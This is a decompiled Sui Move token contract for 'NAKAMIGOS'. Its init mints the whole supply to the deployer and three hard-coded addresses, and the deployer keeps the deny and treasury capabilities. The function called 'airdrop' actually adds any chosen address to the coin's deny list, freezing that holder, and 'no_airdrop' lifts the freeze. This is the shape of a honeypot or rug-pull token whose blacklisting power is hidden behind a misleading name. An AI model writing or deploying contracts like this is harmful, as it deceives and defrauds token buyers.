module 0x574e475ba528a8bf868e42af7fbaf416ba13408e3d056410b067552b7065ac88::nakamigos {
    struct NAKAMIGOS has drop {
        dummy_field: bool,
    }

    public fun airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<NAKAMIGOS>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<NAKAMIGOS>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: NAKAMIGOS, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<NAKAMIGOS>(arg0, 9, b"NAKAMIGOS", b"SUI NAKAMIGOS", b"unique crypto investors on the blockchain with commercial rights.", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://i.seadn.io/gcs/files/1619b033c453fe36c5d9e2ac451379a7.png?auto=format&dpr=1&w=256")), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<NAKAMIGOS>>(v2);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<NAKAMIGOS>>(v1, 0x2::tx_context::sender(arg1));
        0x2::coin::mint_and_transfer<NAKAMIGOS>(&mut v3, 500000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::coin::mint_and_transfer<NAKAMIGOS>(&mut v3, 166666666666666660, @0xbb2a8bd8cbe3ef5e9e89ff6369d7d57afba32032ab99f9071d81984201b37b94, arg1);
        0x2::coin::mint_and_transfer<NAKAMIGOS>(&mut v3, 166666666666666660, @0x69e913240570e08d73a420a29906acc3013462ce79a9f7f94b6875777fbe9ac5, arg1);
        0x2::coin::mint_and_transfer<NAKAMIGOS>(&mut v3, 166666666666666660, @0x5cb636d3c68707cc93502208475759b267788a18dacbe6b810109bacb8988875, arg1);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<NAKAMIGOS>>(v3, 0x2::tx_context::sender(arg1));
    }

    public fun no_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<NAKAMIGOS>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<NAKAMIGOS>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

